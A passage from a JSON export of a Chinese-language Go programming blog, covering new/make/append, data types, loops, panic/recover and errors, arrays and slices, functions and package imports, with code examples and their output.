//(*int)(0xc42000e250) fmt.Printf(\"p1 point to --&gt; %#v \\n \", *p1) //0var p2 *inti := 0p2 = &amp;ifmt.Printf(\"p2 --&gt; %#v \\n \", p2) //(*int)(0xc42000e278) fmt.Printf(\"p2 point to --&gt; %#v \\n \", *p2) //0 上面的代码是等价的，new(int) 将分配的空间初始化为 int 的零值，也就是 0，并返回 int 的指针，这和直接声明指针并初始化的效果是相同的。 make()make 只能用于 slice，map，channel 三种类型，也就是说，在调用 make(T, args) 时，T 只能是slice，map，channel 三种中的其实一种。 make(T, args) 返回的是初始化之后的 T 类型的实例（而不是一个指针）。 123456789101112131415var s1 []intif s1 == nil &#123; fmt.Printf(\"s1 is nil --&gt; %#v \\n \", s1)&#125;s2 := make([]int, 3)if s2 == nil &#123; fmt.Printf(\"s2 is nil --&gt; %#v \\n \", s2)&#125; else &#123; fmt.Printf(\"s2 is not nill --&gt; %#v \\n \", s2)// []int&#123;0, 0, 0&#125;&#125;//outputs1 is nil --&gt; []int(nil) s2 is not nill --&gt; []int&#123;0, 0, 0&#125; 对于 slice 而言，slice 的零值是 nil，当调用 make() 之后， slice 的初始化被完成，即 slice 的长度、容量、底层指向的 array 都在 make() 函数中被初始化了，此时 slice 内容被类型 int 的零值填充，形式是 [0 0 0]，map 和 channel 也是类似的。 12345678910111213141516171819202122232425262728293031func main() &#123; var m1 map[int]string if m1 == nil &#123; fmt.Printf(\"m1 is nil --&gt; %#v \\n \", m1) &#125; m2 := make(map[int]string) if m2 == nil &#123; fmt.Printf(\"m2 is nil --&gt; %#v \\n \", m2) &#125; else &#123; fmt.Printf(\"m2 is not nill --&gt; %#v \\n \", m2) &#125; var c1 chan string if c1 == nil &#123; fmt.Printf(\"c1 is nil --&gt; %#v \\n \", c1) //(chan string)(nil) &#125;36.6 c2 := make(chan string) if c2 == nil &#123; fmt.Printf(\"c2 is nil --&gt; %#v \\n \", c2) &#125; else &#123; fmt.Printf(\"c2 is not nill --&gt; %#v \\n \", c2) //(chan string)(0xc420016120) &#125;&#125;//outputm1 is nil --&gt; map[int]string(nil) m2 is not nill --&gt; map[int]string&#123;&#125; c1 is nil --&gt; (chan string)(nil) c2 is not nill --&gt; (chan string)(0xc000070060) append()可以通过直接使用append() 来向数组中添加元素，此后数组的 len 和 cap 都会自动变大，比如： 12345678910111213141516func main() &#123; var s []int printSlice(s) // append works on nil slices. s = append(s, 0) printSlice(s)&#125;func printSlice(s []int) &#123; fmt.Printf(\"len=%d cap=%d %v\\n\", len(s), cap(s), s)&#125;//outputlen=0 cap=0 []len=1 cap=1 [0] It is common to append new elements to a slice, and so Go provides a built-in append function. The documentation of the built-in package describes append. 1func append(s []T, vs ...T) []T The first parameter s of append is a slice of type T, and the rest are T values to append to the slice. The resulting value of append is a slice containing all the elements of the original slice plus the provided values. If the backing array of s is too small to fit all the given values a bigger array will be allocated. The returned slice will point to the newly allocated array. (To learn more about slices, read the Slices: usage and internals article.) 123456789101112131415161718192021222324252627282930package mainimport &quot;fmt&quot;func main() &#123; var s []int printSlice(s) // append works on nil slices. s = append(s, 0) printSlice(s) // The slice grows as needed. s = append(s, 1) printSlice(s) // We can add more than one element at a time. s = append(s, 2, 3, 4) printSlice(s)&#125;func printSlice(s []int) &#123; fmt.Printf(&quot;len=%d cap=%d %v\\n&quot;, len(s), cap(s), s)&#125;//outputlen=0 cap=0 []len=1 cap=2 [0]len=2 cap=2 [0 1]len=5 cap=8 [0 1 2 3 4]","comments":true,"categories":[{"name":"Golang","slug":"Golang","permalink":"http://swsmile.info/categories/Golang/"}],"tags":[{"name":"Golang","slug":"Golang","permalink":"http://swsmile.info/tags/Golang/"}]},{"title":"【Golang】数据类型","date":"2020-03-15T09:46:28.000Z","path":"2020/03/15/【Golang】类型-数据类型/","text":"类型 序号 类型 描述 1 布尔型（boolean type） 布尔型的值只可以是常量 true 或者 false。一个简单的例子：var b bool = true。 2 数字类型（numeric type） 整型（integer values） int 和浮点型（floating-point values） float32、float64，Go 语言支持整型和浮点型数字，并且支持复数，其中位的运算采用补码。 3 字符串类型（string type） 字符串就是一串固定长度的字符连接起来的字符序列。Go 的字符串是由单个字节连接起来的。Go 语言的字符串的字节使用 UTF-8 编码标识 Unicode 文本。 4 派生类型: 包括：(a) 指针类型（Pointer）(b) 数组类型(c) 结构化类型(struct)(d) Channel 类型(e) 函数类型(f) 切片类型(g) 接口类型（interface）(h) Map 类型 布尔型（boolean type） 布尔型的值只可以是常量 true 或者 false。一个简单的例子：var b bool = true。 数字类型（numeric type）整型（Integer types）Go 也有基于架构的类型，例如：int、uint 和 uintptr。 序号 类型和描述 1 uint8 无符号（unsigned） 8 位整型 （0 到 255） 2 uint16 无符号 16 位整型 （0 到 65535） 3 uint32 无符号 32 位整型 （0 到 4294967295） 4 uint64 无符号 64 位整型 （0 到 18446744073709551615） 5 int8 有符号（signed） 8 位整型 （-128 到 127） 6 int16 有符号 16 位整型 (-32768 到 32767) 7 int32 有符号 32 位整型 (-2147483648 到 2147483647) 8 int64 有符号 64 位整型 (-9223372036854775808 到 9223372036854775807) 浮点型（Floating-point Numbers） 序号 类型 描述 1 float32 IEEE-754 32位浮点型数 2 float64 IEEE-754 64位浮点型数 3 complex64 32 位实数（real part）和虚数（imaginary part） 4 complex128 64 位实数和虚数 其他数字类型以下列出了其他更多的数字类型： 序号 类型和描述 1 byte 类似 uint8 2 rune 类似 int32 3 uint 32 或 64 位 4 int 与 uint 一样大小 5 uintptr 无符号整型，用于存放一个指针 字符串类型（String Type）字符串就是一串固定长度的字符连接起来的字符序列。Go 的字符串是由单个字节连接起来的。Go 语言的字符串的字节使用 UTF-8 编码标识 Unicode 文本。 Strings are immutable: once created, it is impossible to change the contents of a string. The length of a string s can be discovered using the built-in function len. The length is a compile-time constant if the string is a constant. A string’s bytes can be accessed by integer indices 0 through len(s)-1. It is illegal to take the address of such an element; if s[i] is the i‘th byte of a string, &amp;s[i] is invalid. 派生类型（Derived Types）包括： 切片类型（slice types） 数组类型（array types） 结构类型（struct types） 指针类型（pointer types） 函数类型（method types） 接口类型（interface types） map 类型 （map types） Channel 类型（channel types） 切片类型（Slice Types）A slice is a descriptor for a contiguous segment of an underlying array and provides access to a numbered sequence of elements from that array. A slice type denotes the set of all slices of arrays of its element type. The number of elements is called the length of the slice and is never negative. The value of an uninitialized slice is nil. 数组类型（Array Types）An array is a numbered sequence of elements of a single type, called the element type. The number of elements is called the length of the array and is never negative. 结构类型（Struct Types）A struct is a sequence of named elements, called fields, each of which has a name and a type. Field names may be specified explicitly (IdentifierList) or implicitly (EmbeddedField). Within a struct, non-blank field names must be unique. 指针类型（Pointer Types）A pointer type denotes the set of all pointers to variables of a given type, called the base type of the pointer. The value of an uninitialized pointer is nil. 函数类型（Method Types）A function type denotes the set of all functions with the same parameter and result types. The value of an uninitialized variable of function type is nil. 接口类型（Interface Types）An interface type specifies a method set called its interface. A variable of interface type can store a value of any type with a method set that is any superset of the interface. Such a type is said to implement the interface. The value of an uninitialized variable of interface type is nil. map 类型 （Map Types）A map is an unordered group of elements of one type, called the element type, indexed by a set of unique keys of another type, called the key type. The value of an uninitialized map is nil. Channel 类型（Channel Types）A channel provides a mechanism for concurrently executing functions to communicate by sending and receiving values of a specified element type. The value of an uninitialized channel is nil. Reference https://golang.org/ref/spec","comments":true,"categories":[{"name":"Golang","slug":"Golang","permalink":"http://swsmile.info/categories/Golang/"}],"tags":[{"name":"Golang","slug":"Golang","permalink":"http://swsmile.info/tags/Golang/"}]},{"title":"【Golang】循环","date":"2020-03-15T09:43:11.000Z","path":"2020/03/15/【Golang】循环/","text":"For1234567891011package mainimport \"fmt\"func main() &#123; sum := 0 for i := 0; i &lt; 10; i++ &#123; sum += i &#125; fmt.Println(sum)&#125; 无限循环如果循环中条件语句永远不为 false 则会进行无限循环，我们可以通过 for 循环语句中只设置一个条件表达式来执行无限循环： 实例 123456789package mainimport \"fmt\"func main() &#123; for true &#123; fmt.Printf(\"这是无限循环。\\n\"); &#125;&#125; Or 123456package mainfunc main() &#123; for &#123; &#125;&#125; For-each range 循环for 循环的 range 格式可以对 slice、map、数组、字符串等进行迭代循环。格式如下： 123456789101112131415package mainimport \"fmt\"func main() &#123; strings := []string&#123;\"google\", \"runoob\"&#125; for i, s := range strings &#123; fmt.Println(i, s) &#125; numbers := [6]int&#123;1, 2, 3, 5&#125; for i,x:= range numbers &#123; fmt.Printf(\"第 %d 位 x 的值 = %d\\n\", i,x) &#125; &#125; while1234567891011package mainimport \"fmt\"func main() &#123; sum := 1 for sum &lt; 1000 &#123; sum += sum &#125; fmt.Println(sum)&#125;","comments":true,"categories":[{"name":"Golang","slug":"Golang","permalink":"http://swsmile.info/categories/Golang/"}],"tags":[{"name":"Golang","slug":"Golang","permalink":"http://swsmile.info/tags/Golang/"}]},{"title":"【Golang】异常处理","date":"2020-03-15T09:42:24.000Z","path":"2020/03/15/【Golang】异常处理/","text":"异常处理Go语言追求简洁优雅，所以，Go语言不支持传统的 try…catch…finally 的这种异常处理方式。 因为Go语言的设计者们认为，将异常处理逻辑与业务逻辑混在一起会很容易使得代码变得混乱。因为开发者很容易滥用异常，甚至一个小小的错误都抛出一个异常。 在Go语言中，通过利用多值返回来返回错误。因此，不要用异常代替错误（在 Go 的世界中，我们只能使用 error，而不是 exception），更不要用是否有抛出异常来改变控制程序执行流程（在 Java、C#中我们往往都是这样做的）。在极个别的情况下，也就是说，遇到真正的异常的情况下（比如除数为0了）。才使用Go中引入的Exception处理：defer, panic, recover。 这几个异常的使用场景可以这么简单描述：Go中可以通过调用 panic() 来抛出一个异常（这意味着你可以在任何地方调用 panic() 来表示一个自定义异常），然后通过 defer 关键字声明一个异常处理函数，最后在这个异常处理函数中通过 recover() 捕获任何之前未被捕获的异常，并进行相应的异常处理。 实验Example 1123456789101112131415161718192021222324252627282930package mainimport ( \"fmt\")func f() &#123; defer func() &#123; fmt.Println(\"b\") if err := recover(); err != nil &#123; fmt.Println(err) &#125; fmt.Println(\"d\") &#125;() fmt.Println(\"a\") panic(\"a bug occur\") fmt.Println(\"c\")&#125;func main() &#123; f() fmt.Println(\"x\")&#125;//outputaba bug occurdx b 在 x 之前输出，这意味着，当有任何异常抛出时，就会执行通过 defer 声明的对应异常处理函数。 Example 21234567891011121314151617181920212223242526272829package mainimport ( \"fmt\")func f() &#123; defer func() &#123; fmt.Println(\"b\") if err := recover(); err != nil &#123; fmt.Println(err) &#125; fmt.Println(\"d\") &#125;() fmt.Println(\"a\") fmt.Println(\"c\")&#125;func main() &#123; f() fmt.Println(\"x\")&#125;//outputacbdx 我们发现，当没有异常被抛出时（输出了 b 和 d），通过 defer 声明的异常处理函数还是会被调用。而被调用的时机是当当前这一层的调用栈被执行完时。 这也意味着，我们最好只是在 if err := recover(); err != nil 的内部添加代码，从而使得通过 defer 声明的异常处理函数就是正在意义上的异常处理函数（因为即使没有出现任何异常时，这个异常处理函数虽然仍然被触发，然后不产生任何 side-effect）。 注意，defer就是用来添加函数结束时执行的语句。 ErrorsIntroductionGo code uses error values to indicate an abnormal state. For example, the os.Open function returns a non-nil error value when it fails to open a file. 1func Open(name string) (file *File, err error) The following code uses os.Open to open a file. If an error occurs it calls log.Fatal to print the error message and stop. 12345f, err := os.Open(&quot;filename.ext&quot;)if err != nil &#123; log.Fatal(err)&#125;// do something with the open *File f The error typeThe error type is an interface type. An error variable represents any value that can describe itself as a string. Here is the interface’s declaration: 123type error interface &#123; Error() string&#125; The most commonly-used error implementation is the errors package’s unexported errorString type. 12345678// errorString is a trivial implementation of error.type errorString struct &#123; s string&#125;func (e *errorString) Error() string &#123; return e.s&#125; You can construct one of these values with the errors.New function. It takes a string that it converts to an errors.errorString and returns as an error value. 1234// New returns an error that formats as the given text.func New(text string) error &#123; return &amp;errorString&#123;text&#125;&#125; Here’s how you might use errors.New: 123456func Sqrt(f float64) (float64, error) &#123; if f &lt; 0 &#123; return 0, errors.New(&quot;math: square root of negative number&quot;) &#125; // implementation&#125; Reference https://blog.golang.org/error-handling-and-go","comments":true,"categories":[{"name":"Golang","slug":"Golang","permalink":"http://swsmile.info/categories/Golang/"}],"tags":[{"name":"Golang","slug":"Golang","permalink":"http://swsmile.info/tags/Golang/"}]},{"title":"【Golang】静态数组（Array）和切片（slices）","date":"2020-03-15T09:13:12.000Z","path":"2020/03/15/【Golang】类型-Array和slice/","text":"数组（Array）Go 语言数组声明需要指定元素类型及元素个数，语法格式如下： 1var variable_name [SIZE]variable_type The type [n]T is an array of n values of type T. The expression 1var a [10]int declares a variable a as an array of ten integers. An array’s length is part of its type, so arrays cannot be resized. 注意，数组的长度在数组定义后就不能再变化了。 1234567891011121314package mainimport \"fmt\"func main() &#123; var a [2]string a[0] = \"Hello\" a[1] = \"World\" fmt.Println(a[0], a[1]) fmt.Println(a) primes := [6]int&#123;2, 3, 5, 7, 11, 13&#125; // or primes := []int&#123;2, 3, 5, 7, 11, 13&#125; fmt.Println(primes)&#125; 初始化数组中 {} 中的元素个数不能大于 [] 中的数字。 注意，数组和切片（即切片）的区别在于：声明数组时，需要显式指明数据的长度，而切片不需要。 如果忽略 [] 中的数字不设置数组大小，Go 语言会根据元素的个数来设置数组的大小： 1234// 声明切片var balance = []float32&#123;1000.0, 2.0, 3.4, 7.0, 50.0&#125;// 声明（静态）数组var balance = [5]float32&#123;1000.0, 2.0, 3.4, 7.0, 50.0&#125; 而（静态）数组与切片之间不能相互转换： 12345678package mainfunc main() &#123; var a [5]int = [5]int&#123;1,2,3,4,5&#125; test(a)&#125;func test(b []int) &#123;&#125; error： 12# command-line-arguments./main.go:5:6: cannot use a (type [5]int) as type []int in argument to test Array Iteration1234567891011121314151617// Show index only, seldom usedlist := []int&#123;2, 3, 5, 7, 11, 13&#125;for index := range list &#123; fmt.Println(\"index:\", index)&#125;// Show value onlyfor _, value := range list &#123; fmt.Println(\"value:\", value)&#125;// show index and valuefor index, value := range list &#123; fmt.Println(\"index:\", index) fmt.Println(\"value:\", value) fmt.Println()&#125; Array Copy12345678910func main() &#123; var a []int = []int&#123;1,2&#125; fmt.Printf(\"%p\\n\", &amp;a) b := a fmt.Printf(\"%p\\n\", &amp;b)&#125;//0xc00000c060//0xc00000c080 切片（Slices） An array has a fixed size. A slice, on the other hand, is a dynamically-sized, flexible view into the elements of an array. In practice, slices are much more common than arrays. A slice is a descriptor for a contiguous segment of an underlying array and provides access to a numbered sequence of elements from that array. 注意，由于切片（Slices） 只是底层数组的连续元素的一个描述符，因此切片中的元素对应的内存地址和这个元素对应在底层数组的元素的内存地址是完全相同的。 这也意味着， The type []T is a slice with elements of type T. A slice is formed by specifying two indices, a low and high bound, separated by a colon: 1a[low : high] This selects a half-open range which includes the first element, but excludes the last one. The following expression creates a slice which includes elements 1 through 3 of a: 1a[1:4] 12345678910package mainimport \"fmt\"func main() &#123; primes := [6]int&#123;2, 3, 5, 7, 11, 13&#125; var s []int = primes[1:4] fmt.Println(s)&#125; 定义切片你可以使用一个未指定大小的数组来声明一个切片： 1var identifier []type 切片不需要说明长度。 或者，使用 make() 函数来初始化一个切片 12345var slice1 []type = make([]type, len)也可以简写为slice1 := make([]type, len) 也可以指定容量，其中capacity为可选参数。 1make([]T, length, capacity) length 是这个切片对应的静态数组实际拥有元素的数量 capacity 是这个切片目前可以容纳元素的数量，或者说体现了该切片实际在内存中占用的空间长度（当其对应的静态数组实际拥有元素的数量超过了这个数字，golang内内部会自动对该切片实际在内存中占用的空间进行自动增加，这对developer来说是完全透明的） 切片初始化的几种情况Case 1 - 提供具体数值初始化切片1s := []int&#123;1,2,3 &#125; 直接初始化切片，[] 表示是切片类型，{1,2,3} 表示该切片包含三个元素，分别是1,2,3，其cap=len=3 1s := arr[:] Case 2 - 通过make() 初始化切片1s := make([]int,len,cap) 通过内置函数 make() 初始化切片 s，[]int 标识为其元素类型为int的切片。 从底层操作来说，上面代码在内存空间中开辟了一个长度为 len 的 []int 数组。 因此，A slice created with make always allocates a new, hidden array to which the returned slice value refers. That is, executing 1make([]T, length, capacity) produces the same slice as allocating an array and slicing it, so these two expressions are equivalent: 12make([]int, 50, 100)new([100]int)[0:50] Case 3 - 将一个静态数组的一部分转换为切片初始化切片s，是数组arr的引用 1s := arr[startIndex:endIndex] 将arr中从下标startIndex到endIndex-1 下的元素创建为一个新的切片 1s := arr[startIndex:] 默认 endIndex 时将表示一直到arr的最后一个元素 1s := arr[:endIndex] 默认 startIndex 时将表示从arr的第一个元素开始 1s1 := s[startIndex:endIndex] 即，通过切片s初始化切片s1。 如果通过这种将“一个静态数组的一部分”转换出一个切片，这个切片其实是原数组（或者说底层数组）的一个描述符，这意味着： 改变原数组中元素的值，也会影响到切片 1234567891011121314151617181920212223package mainimport ( \"fmt\")func main() &#123; var a []int = []int&#123;1, 2, 3, 4, 5, 6&#125; fmt.Printf(\"%p\\n\", &amp;a) b := a[0:3] fmt.Printf(\"%p\\n\", &amp;b) a[2] = 100 fmt.Printf(\"%v\\n\", a) fmt.Printf(\"%v\\n\", b)&#125;// output 0xc00008a0200xc00008a040[1 2 100 4 5 6][1 2 100] 自然地，改变切片中元素的值，也会影响到原数组 1234567891011121314151617181920212223package mainimport ( \"fmt\")func main() &#123; var a []int = []int&#123;1, 2, 3, 4, 5, 6&#125; fmt.Printf(\"%p\\n\", &amp;a) b := a[0:3] fmt.Printf(\"%p\\n\", &amp;b) b[2] = 200 fmt.Printf(\"%v\\n\", a) fmt.Printf(\"%v\\n\", b)&#125;// output 0xc00008a0200xc00008a040[1 2 200 4 5 6][1 2 200] 改变从同一个数组转换出来的切片的值，也会应该从同同一个数组转换出来的其他切片的值（again，这其实还是因为切片只是其底层数组的描述符） 12345678910111213141516package mainimport ( \"fmt\")func main() &#123; var a []int = []int&#123;1, 2, 3, 4, 5, 6&#125; b := a[0:3] c := a[0:3] b[2] = 200 fmt.Printf(\"%v\\n\", b) fmt.Printf(\"%v\\n\", c)&#125; len() 和 cap() 函数A slice has both a length and a capacity. The length of a slice is the number of elements it contains. The capacity of a slice is the number of elements in the underlying array, counting from the first element in the slice. The length and capacity of a slice s can be obtained using the expressions len(s) and cap(s). You can extend a slice’s length by re-slicing it, provided it has sufficient capacity. Try changing one of the slice operations in the example program to extend it beyond its capacity and see what happens. 实例 123456789101112131415161718192021222324252627282930package mainimport &quot;fmt&quot;func main() &#123; s := []int&#123;2, 3, 5, 7, 11, 13&#125; printSlice(s) // Slice the slice to give it zero length. s = s[:0] printSlice(s) // Extend its length. s = s[:4] printSlice(s) // Drop its first two values. s = s[2:] printSlice(s)&#125;func printSlice(s []int) &#123; fmt.Printf(&quot;len=%d cap=%d %v\\n&quot;, len(s), cap(s), s)&#125;//outputlen=6 cap=6 [2 3 5 7 11 13]len=0 cap=6 []len=4 cap=6 [2 3 5 7]len=2 cap=4 [5 7] 看起来，上面的规律是： 如果指定了起始的 index，那么返回的 slice 的 cap 为从该起始 index 到末尾的长度 如果没有指定起始 index，那么返回的 slice 的 cap 与原数组长度相同 对为 nil 的 array 取 len1234567891011var a []int32 = make([]int32, 5)println(a == nil) //falsevar b []int32println(b == nil) //truevar c []int32println(len(c)) //0，这里很奇怪// compiling error//var d *[]int32//println(len(d)) 切片元素追加12345678910package mainfunc main() &#123; statisArr := [8]int&#123;0, 1, 2, 3, 4, 5, 6, 7&#125; arr := make([]int, 0) for _, ele := range statisArr &#123; arr = append(arr, ele) &#125;&#125; 切片的扩容//TODO 空切片（nil）一个切片在未初始化之前默认为 nil，长度为 0，实例如下： 实例 123456789101112131415161718192021package mainimport \"fmt\"func main() &#123; var numbers []int printSlice(numbers) if(numbers == nil)&#123; fmt.Printf(\"切片是空的\") &#125;&#125;func printSlice(x []int)&#123; fmt.Printf(\"len=%d cap=%d slice=%v\\n\",len(x),cap(x),x)&#125;//outputlen=0 cap=0 slice=[]切片是空的 多维切片（Multi-dimensional Slices）Like arrays, slices are always one-dimensional but may be composed to construct higher-dimensional objects. With arrays of arrays, the inner arrays are, by construction, always the same length; however with slices of slices (or arrays of slices), the inner lengths may vary dynamically. Moreover, the inner slices must be initialized individually. 1234567891011121314151617package mainimport ( \"fmt\")func main() &#123; a := make([][]int, 0) a1 := []int&#123;1, 2, 3, 4&#125; a = append(a, a1) a2 := []int&#123;100&#125; a = append(a, a2) fmt.Printf(\"%v\\n\", a)&#125; Reference https://golang.org/ref/spec","comments":true,"categories":[{"name":"Golang","slug":"Golang","permalink":"http://swsmile.info/categories/Golang/"}],"tags":[{"name":"Golang","slug":"Golang","permalink":"http://swsmile.info/tags/Golang/"}]},{"title":"【Golang】函数","date":"2020-03-15T09:12:18.000Z","path":"2020/03/15/【Golang】类型-函数/","text":"函数定义A function type denotes the set of all functions with the same parameter and result types. The value of an uninitialized variable of function type is nil. Go 语言函数定义格式如下： 123func function_name( [parameter list] ) [return_types] &#123; 函数体&#125; 函数定义解析： func：函数由 func 开始声明 function_name：函数名称，函数名和参数列表一起构成了函数签名。 parameter list：参数列表，参数就像一个占位符，当函数被调用时，你可以将值传递给参数，这个值被称为实际参数。参数列表指定的是参数类型、顺序、及参数个数。参数是可选的，也就是说函数也可以不包含参数。 return_types：返回类型，函数返回一列值。return_types 是该列值的数据类型。有些功能不需要返回值，这种情况下 return_types 不是必须的。 函数体：函数定义的代码集合。 比如： 1234567891011package mainimport \"fmt\"func add(x int, y int) int &#123; return x + y&#125;func main() &#123; fmt.Println(add(42, 13))&#125; Example: 12345678func()func(x int) intfunc(a, _ int, z float32) boolfunc(a, b int, z float32) (bool)func(prefix string, values ...int)func(a, b int, z float64, opt ...interface&#123;&#125;) (success bool)func(int, int, float64) (float64, *[]int)func(n int) func(p *T) 函数命名规范由于Golang的特殊性（用大小写来控制函数的可见性），除特殊的性能测试与单元测试函数之外，都应该遵循如下原则： 使用驼峰命名 如果包外不需要访问请用小写开头的函数 如果需要暴露出去给包外访问需要使用大写开头的函数名称 一个典型的函数命名方法如下： 1234567891011121314// 注释一律使用双斜线， 对象暴露的方法func (*fileDao) AddFile(file *model.File) bool &#123; result := db.NewRecord(*file) if result &#123; db.Create(file) &#125; return result&#125; // 不需要给包外访问的函数如下func removeCommaAndQuote(content string) string &#123; re, _ := regexp.Compile(\"[\\\\`\\\\,]+\") return strings.TrimSpace(re.ReplaceAllString(content, \"\"))&#125; Receiver - 类的函数golang 中存在receiver 的概念，receiver 名称应该尽量保持一致 1234567type A struct&#123;&#125;func (a *A) methodA() &#123;&#125;func (a *A) methodB() &#123; a.methodA()&#125; Pointer receiversYou can declare methods with pointer receivers. This means the receiver type has the literal syntax *T for some type T. (Also, T cannot itself be a pointer such as *int.) For example, the Scale method here is defined on *Vertex. Methods with pointer receivers can modify the value to which the receiver points (as Scale does here). Since methods often need to modify their receiver, pointer receivers are more common than value receivers. Try removing the * from the declaration of the Scale function on line 16 and observe how the program’s behavior changes. With a value receiver, the Scale method operates on a copy of the original Vertex value. (This is the same behavior as for any other function argument.) The Scale method must have a pointer receiver to change the Vertex value declared in the main function. 1234567891011121314151617181920212223242526272829package mainimport ( \"fmt\" \"math\")type Vertex struct &#123; X, Y float64&#125;func (v Vertex) Abs() float64 &#123; return math.Sqrt(v.X*v.X + v.Y*v.Y)&#125;func (v *Vertex) Scale(f float64) &#123; v.X = v.X * f v.Y = v.Y * f&#125;func main() &#123; v := Vertex&#123;3, 4&#125; v.Scale(10) fmt.Println(v.Abs())&#125;//output50 可变长度参数The final incoming parameter in a function signature may have a type prefixed with .... A function with such a parameter is called variadic and may be invoked with zero or more arguments for that parameter. Summary Usage支持可变长参数列表的函数可以支持任意个传入参数，比如 fmt.Println 函数就是一个支持可变长参数列表的函数。 12345678910111213141516171819202122232425package mainimport \"fmt\"// 这个函数可以传入任意数量的整型参数func sum(nums ...int) &#123; fmt.Print(nums, \" \") total := 0 for _, num := range nums &#123; total += num &#125; fmt.Println(total)&#125;func main() &#123; // 支持可变长参数的函数调用方法和普通函数一样 // 也支持只有一个参数的情况 sum(1, 2) sum(1, 2, 3) // 如果你需要传入的参数在一个切片中，像下面一样 // \"func(slice...)\"把切片打散传入 nums := []int&#123;1, 2, 3, 4&#125; sum(nums...)&#125; 输出结果为 123[1 2] 3[1 2 3] 6[1 2 3 4] 10 需要注意的是，可变长参数应该是函数定义的最右边的参数，即最后一个参数。 一个简单可变参数函数这个函数返回经过空格连接以后的参数形成的字符串。 123func toFullname(names ...stirng) string &#123; return strings.Join(names, \" \")&#125; 你可以不传或传入更多的参数1234567891011toFullname(\"carl\", \"sagan\")// output: \"carl sagan\"toFullname(\"carl\")// output: \"carl\"toFullname()// output: \"\" 切片和可变参数函数可变参数函数会在其内部创建一个”新的切片”。事实上，可变参数是一个简化了切片类型参数传入的语法糖。 不传参数当你不传入参数的时候，可变参数会成为一个空值切片（ nil )。 传入已有的切片你可以通过向一个已有的切片添加可变参数运算符 ”…“ 后缀的方式将其传入可变参数函数。 12345names := []string&#123;\"carl\", \"sagan\"&#125;toFullname(names...)// output: \"carl sagan\" 这就好比通常的传参方式： 1toFullname(\"carl\", \"sagan\") 一些切片传入后的特异表现假设你传入了一个已有的切片到某可变参数函数： 123dennis := []string&#123;\"dennis\", \"ritchie\"&#125;toFullname(dennis...) 假设这个函数在内部改变了可变参数的第一个元素，譬如这样： 1234func toFullname(names ...string) string &#123; names[0] = \"guy\" return strings.Join(names, \" \")&#125; 而这个修改会影响到源切片，”dennis“ 现在的值是： 1[]string&#123;\"guy\", \"ritchie\"&#125; 而非最初： 1[]string&#123;\"dennis\", \"ritchie\"&#125; 这是因为，传入的切片和函数内部使用的切片共享同一个底层数组，因此在函数内部改变这个数组的值同样会影响到传入的切片： 如果你直接传入参数（不使用切片），自然就不会产生这个现象了。 同类型函数参数When two or more consecutive named function parameters share a type, you can omit the type from all but the last. 1234567891011package mainimport \"fmt\"func add(x, y int) int &#123; return x + y&#125;func main() &#123; fmt.Println(add(42, 13))&#125; In this example, we shortened 1x int, y int to 1x, y int 函数返回多个值Go 函数可以返回多个值，例如： 实例 123456789101112package mainimport &quot;fmt&quot;func swap(x, y string) (string, string) &#123; return y, x&#125;func main() &#123; a, b := swap(&quot;Google&quot;, &quot;Runoob&quot;) fmt.Println(a, b)&#125; Named return valuesGo’s return values may be named. If so, they are treated as variables defined at the top of the function. These names should be used to document the meaning of the return values. A return statement without arguments returns the named return values. This is known as a “naked” return. Naked return statements should be used only in short functions, as with the example shown here. They can harm readability in longer functions. 12345678910111213package mainimport &quot;fmt&quot;func split(sum int) (x, y int) &#123; x = sum * 4 / 9 y = sum - x return&#125;func main() &#123; fmt.Println(split(17))&#125; Example123456789101112131415161718192021222324252627282930313233343536373839404142434445func Open(dialect string, args ...interface&#123;&#125;) (db *DB, err error) &#123; if len(args) == 0 &#123; err = errors.New(\"invalid database source\") return nil, err &#125; var source string var dbSQL SQLCommon var ownDbSQL bool switch value := args[0].(type) &#123; case string: var driver = dialect if len(args) == 1 &#123; source = value &#125; else if len(args) &gt;= 2 &#123; driver = value source = args[1].(string) &#125; dbSQL, err = sql.Open(driver, source) ownDbSQL = true case SQLCommon: dbSQL = value ownDbSQL = false default: return nil, fmt.Errorf(\"invalid database source: %v is not a valid type\", value) &#125; db = &amp;DB&#123; db: dbSQL, logger: defaultLogger, callbacks: DefaultCallback, dialect: newDialect(dialect, dbSQL), &#125; db.parent = db if err != nil &#123; return &#125; // Send a ping to make sure the database connection is alive. if d, ok := dbSQL.(*sql.DB); ok &#123; if err = d.Ping(); err != nil &amp;&amp; ownDbSQL &#123; d.Close() &#125; &#125; return&#125; ​ Reference https://golang.org/ref/spec https://studygolang.com/articles/1965 https://studygolang.com/articles/11965","comments":true,"categories":[{"name":"Golang","slug":"Golang","permalink":"http://swsmile.info/categories/Golang/"}],"tags":[{"name":"Golang","slug":"Golang","permalink":"http://swsmile.info/tags/Golang/"}]},{"title":"【Golang】模块管理与引用","date":"2020-03-15T09:06:02.000Z","path":"2020/03/15/【Golang】依赖-模块管理与引用/","text":"包声明 - package在go源文件的开头必须申明文件所属的package，如下所示： 12package name...... 一些实验发现实验 1注意，位于同一个文件夹下的所有 .go 文件，它们的 package name 一定要完全一致。比如，由于 ccc.go 和 ddd.go 两个文件都位于 bbb 文件夹下，因此这两个文件的 package name 必需要完全一致（但这个 package name 不要求一定为 bbb，即不一定要和所在文件夹的文件夹名称相同）。 如果不一致，则会提示以下错误： 实验 2一个正确的引用： aaa/bbb/ccc.go1234567package cccPackageNameimport \"fmt\"func SayHello(name string) string &#123; return fmt.Sprintf(\"Hello, %s\", name)&#125; main.go1234567package mainimport &quot;swtest/aaa/bbb&quot;func main() &#123; cccPackageName.SayHello(&quot;sss&quot;)&#125; go.mod123module swtestgo 1.13 https://www.digitalocean.com/community/tutorials/how-to-write-packages-in-go 实验 3结论：在同一个文件夹下的不同文件中的函数，它们在被 import 时，都是 equivalent 的。 aaa/bbb/ccc.go1234567package bbbimport \"fmt\"func SayHello(name string) string &#123; return fmt.Sprintf(\"Hello, %s\", name)&#125; aaa/bbb/ddd.go1234567package bbbimport \"fmt\"func SayHello2(s string) &#123; fmt.Println(s)&#125; main.go12345678910package mainimport ( \"awesomeProject/aaa/bbb\")func test() &#123; bbb.SayHello(\"test1\") bbb.SayHello2(\"test2\")&#125; go.mod123module awesomeProjectgo 1.13 命名规范 建议package命名用小写字母 建议package命名必和其路径的最后一段一致（main package除外） main package中的main方法是可执行文件的入口，main package名可以和路径名不一致 不同路径下package命名可以重复，但其完整路径名必须唯一 package 名和导入路径package的导入路径是指从$GOPATH/src/开始的路径名。例如 package github.com/zhaohuabing/demo 在文件系统中的路径为：$GOPATH/src/github.com/zhaohuabing/demo Import12345678910package mainimport ( &quot;fmt&quot; &quot;math/rand&quot;)func main() &#123; 